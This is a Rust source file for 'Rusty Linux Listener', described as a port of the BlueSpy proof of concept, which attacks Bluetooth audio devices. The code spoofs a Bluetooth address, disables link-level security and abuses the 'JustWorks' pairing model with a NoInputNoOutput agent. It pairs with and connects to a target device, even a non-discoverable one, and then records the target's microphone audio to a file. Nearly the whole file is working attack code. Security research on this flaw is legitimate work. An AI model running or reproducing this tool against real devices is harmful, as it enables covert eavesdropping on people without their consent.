
use std::{thread, io};
use std::time::Duration;
use clap::Parser;
use bluer::{ agent::Agent, Adapter, Address, Session};

pub mod utils;
use utils::helper::*;
use utils::adapter::*;
use utils::record_play::*;

// Using Clap crate to parse user inputs
#[derive(Parser)]
#[command(name = "Rusty Linux Listener")]
#[command(version = "1.0")]
#[command(about = "Rust implementation of Tarlogic 'BlueSpy' proof of concept.", long_about = None)]
struct Cli {
    // 'iface' variable used to identify bluetooth interface if specified (OPTIONAL)
    #[arg(short = 'i', long = "interface")]
    iface: Option<String>,
    // 'spoof' variable used to spoof specified bluetooth address (OPTIONAL)
    #[arg(short = 's', long = "spoofing", value_parser = assert_addr)]
    spoof: Option<Address>,
    // 'bt_addr' variable used to identify bluetooth target (MANDATORY)
    #[arg(short = 't', long = "target", value_parser = assert_addr)]
    bt_addr: Address,
    // 'output_format' variable used to specify output format of recorded audio (OPTIONAL)
    #[arg(short = 'f', long = "format")]
    output_format: Option<String>,
    // 'sink' variable used to specify sink for audio output, once recorded (OPTIONAL)
    #[arg(short = 'o', long = "sink", value_parser = assert_sink)]
    sink: Option<String>,
}

#[tokio::main(flavor = "current_thread")]
async fn main() -> bluer::Result<()> {

    let cli = Cli::parse();

    let session = Session::new().await?;

    // If user hasn't specified bluetooth interface, a default one would be taken.
    let adapter: Adapter;
    match cli.iface {
        Some(adapter_name) => adapter = session.adapter(&adapter_name).expect("Unable to find designated adapter !"),
        None => adapter = session.default_adapter().await.expect("No available adapter found !"),
    }

    // Starting bluetooth adapter.
    adapter.set_powered(true).await?;

    // If Some(), spoofing specified bt_addr.
    match cli.spoof {
        Some(spoof_addr) => {
            adapter.set_address(spoof_addr.to_string());

            // Power cycle to update adapter bt_addr
            adapter.set_powered(false).await?;
            thread::sleep(Duration::from_secs(1));
            adapter.set_powered(true).await?;
        },
        None => println!("No spoofed address specified. If you want more chance of success, please specify `-s` or `-spoofing`"),
    }
    
    // Activate pairable adapter
    adapter.set_pairable(true).await?;

    // Disable link level security
    adapter.disable_linksec();

    // Creating agent with "NoInputNoOutput" capability to exploit "JustWorks" association model.
    let agent = Agent {
        request_default: false,
        request_pin_code: None,
        display_pin_code: None,
        request_passkey: None,
        display_passkey: None,
        request_confirmation: None,
        request_authorization: None,
        authorize_service: None,
        ..Default::default()
    };
    let _handle_agent = session.register_agent(agent).await?;
    println!("Registered 'NoInputNoOutput' profile !");

    // Searching for target in discoverable mode and pairing !
    let device = match find_device(&adapter, cli.bt_addr).await {
        Ok(dev) => {
            if !dev.is_paired().await? {
                println!("Pairing {}", cli.bt_addr);
                dev.pair().await?;
            } else {
                println!("Device {} is already paired", cli.bt_addr);
            }
            dev
        },
        Err(err) => {
            // Attempt to reach target in non discoverable mode !
            println!("Timeout or error occured : {}\nDevice may be in non-discoverable mode, attempt to reach through btmgmt !", err);
            if nondisc_pair_attempt(cli.bt_addr.to_string()){
                adapter.device(cli.bt_addr).unwrap()
            } else {
                panic!("Unreachable device, failed pairing, target not available or may not be vulnerable to attack!");
            }
        }
    };

    // Delay between pairing and connection.
    thread::sleep(Duration::from_secs(5));
    
    if !device.is_connected().await? {
        println!("Connecting to device...");
        device.connect().await?;
        println!("Device connected.");
    }

    // Delay between connection and start recording.
    thread::sleep(Duration::from_secs(3));

    println!("Starting recording...");
    println!("Recording !");
    println!("To interrupt recording, please send SIGINT 'CTRL + C' !");

    let filename = match cli.output_format {
        Some(file) => file,
        None => "recording.wav".to_string()
    };
    
    // Recording audio of targeted device.
    match record(cli.bt_addr.to_string(), filename.clone()) {
        Ok(_) =>  { 
            println!("Successfully recorded !");

            // Asking user if he wants audio recorded audio playback.
            let mut input_raw = String::new();
            println!("Play back audio recording ? (y/n)");
            io::stdin().read_line(&mut input_raw).unwrap();
            let input = input_raw.trim();
        
            if input == "y" || input == "yes" {
                playback(cli.sink, filename);
            }
        },
        Err(err) => println!("Error while recording : {}", err),
    }

    println!("Exiting now !");

    Ok(())
}
